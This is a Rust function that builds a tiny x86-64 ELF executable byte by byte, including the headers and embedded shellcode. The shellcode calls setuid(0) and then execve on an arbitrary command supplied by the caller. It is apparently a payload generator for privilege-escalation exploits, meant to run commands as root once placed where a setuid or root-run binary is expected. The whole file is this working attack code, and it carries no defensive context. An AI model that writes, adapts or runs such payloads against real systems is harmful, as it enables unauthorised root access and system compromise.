/// Dynamically builds an ELF payload that executes a specific command.
pub fn build_elf_payload(command: &str) -> Vec<u8> {
    let mut payload = Vec::new();

    // 1. ELF Header (64 bytes)
    payload.extend_from_slice(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"); // e_ident
    payload.extend_from_slice(&2u16.to_le_bytes()); // e_type (ET_EXEC)
    payload.extend_from_slice(&62u16.to_le_bytes()); // e_machine (EM_X86_64)
    payload.extend_from_slice(&1u32.to_le_bytes()); // e_version
    payload.extend_from_slice(&0x400078u64.to_le_bytes()); // e_entry (Starts right after headers)
    payload.extend_from_slice(&64u64.to_le_bytes()); // e_phoff (Program header follows ELF header)
    payload.extend_from_slice(&0u64.to_le_bytes()); // e_shoff (No section headers)
    payload.extend_from_slice(&0u32.to_le_bytes()); // e_flags
    payload.extend_from_slice(&64u16.to_le_bytes()); // e_ehsize
    payload.extend_from_slice(&56u16.to_le_bytes()); // e_phentsize
    payload.extend_from_slice(&1u16.to_le_bytes()); // e_phnum (1 program header)
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shentsize
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shnum
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shstrndx

    // 2. Program Header (56 bytes)
    payload.extend_from_slice(&1u32.to_le_bytes()); // p_type (PT_LOAD)
    payload.extend_from_slice(&5u32.to_le_bytes()); // p_flags (PF_X | PF_R)
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_offset
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_vaddr
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_paddr

    // We'll update p_filesz and p_memsz later once we know the total size.
    let size_offset = payload.len();
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_filesz (placeholder)
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_memsz (placeholder)
    payload.extend_from_slice(&0x1000u64.to_le_bytes()); // p_align

    // 3. Shellcode
    // This shellcode does: setuid(0), execve(command, NULL, NULL), exit(0)
    let mut shellcode = Vec::new();
    shellcode.extend_from_slice(b"\x31\xc0\x31\xff\xb0\x69\x0f\x05"); // xor eax,eax; xor edi,edi; mov al,0x69; syscall (setuid 0)
    shellcode.extend_from_slice(b"\x48\x8d\x3d\x0f\x00\x00\x00"); // lea rdi, [rip + 15] (Pointer to command string)
    shellcode.extend_from_slice(b"\x31\xf6\x6a\x3b\x58\x99\x0f\x05"); // xor esi,esi; push 59; pop rax; cdq; syscall (execve)
    shellcode.extend_from_slice(b"\x31\xff\x6a\x3c\x58\x0f\x05"); // xor edi,edi; push 60; pop rax; syscall (exit)

    payload.extend_from_slice(&shellcode);
    payload.extend_from_slice(command.as_bytes());
    payload.push(0); // Null terminator for the command string

    // 4. Update the total size in the program header
    let total_size = payload.len() as u64;
    payload[size_offset..size_offset + 8].copy_from_slice(&total_size.to_le_bytes());
    payload[size_offset + 8..size_offset + 16].copy_from_slice(&total_size.to_le_bytes());

    payload
}
